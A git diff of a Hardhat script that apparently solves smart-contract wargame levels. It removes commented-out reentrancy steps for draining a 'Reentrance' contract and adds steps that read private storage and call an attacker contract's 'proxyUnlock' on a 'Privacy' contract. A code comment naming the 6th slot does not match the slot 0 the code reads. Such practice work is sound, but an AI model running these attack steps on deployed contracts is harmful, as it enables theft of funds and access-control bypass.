@@ -1,13 +1,13 @@
 import { ethers } from "hardhat";
 import { wrapEthersProvider } from "hardhat-tracer";
-const CONTRACT_ADDRESS = "0x903bdD4bCCDC8F2eF30088fc8c7f8a1070063c99";
+const CONTRACT_ADDRESS = "0xbae24653124CA68cEd2A23C395100d9250edA62A";
 const PLAYER_ADDRESS = "0x81215d34367AF48d01E728AfF2976d9Df32fE604";
-const ATTACKER_CONTRACT = "0x477c33D6E3dDc8E407818FF28137159dE4439F82";
+const ATTACKER_CONTRACT = "0x2681D56626713Bc4b7Fb929599D2634d5fe22F87";
 
 async function main() {
   const signer = await ethers.getSigner(PLAYER_ADDRESS);
   const contract = await ethers.getContractAt(
-    "Reentrance",
+    "Privacy",
     CONTRACT_ADDRESS,
     signer
   );
@@ -28,35 +28,17 @@ async function main() {
     signer
   );
 
-  const eth001 = "1000000000000000"; // .002 ethers
-
-  // step 1: Call the donate function to register contract address
-  // const donateToVictimTX = await attackerContract.donateToVictim({
-  //   value: eth001,
-  // });
-
-  // Display donateToVictim Transaction
-  // console.log(donateToVictimTX);
-  //step 2: validate the contract has .002 eth in it's contract balance holdings
-  // const viewBalanceOfTX = await contract.balanceOf(ATTACKER_CONTRACT);
-
-  // console.log(
-  //   "the balance of the attacker contract should be .001 eth and it is:  ",
-  //   viewBalanceOfTX
-  // );
-  // step: 3: Trigger the re-entrency call
-  // const attackTX = await attackerContract.attack();
-
-  // console.log(attackTX);
-
-  // Step 4: view balance of contract
-  // view balance of the contract after attack
-  // const contractBalanceTX = await ethers.provider.getBalance(CONTRACT_ADDRESS);
-
-  // console.log(`The balance of the reentrence contract is ${contractBalanceTX}`);
-
-  // step 5: remove all funds and return to original wallet
-  console.log(await attackerContract.withdrawToCaller());
+  // Step 1 - retrieve the data of the privacy contract at the 6th slot
+  const data = await ethers.provider.getStorageAt(CONTRACT_ADDRESS, 0);
+  console.log("The data at storage slot 0 is ", data);
+  // Step 2 pass this data to the attacker contract proxy unlock function
+  const callProxyUnlock = await attackerContract.proxyUnlock(data);
+  console.log(callProxyUnlock);
+  // step3 call the lock function to see if it is false
+  console.log(
+    "The contract will return false if unlocked",
+    await contract.locked()
+  );
 }
 
 // We recommend this pattern to be able to use async/await everywhere
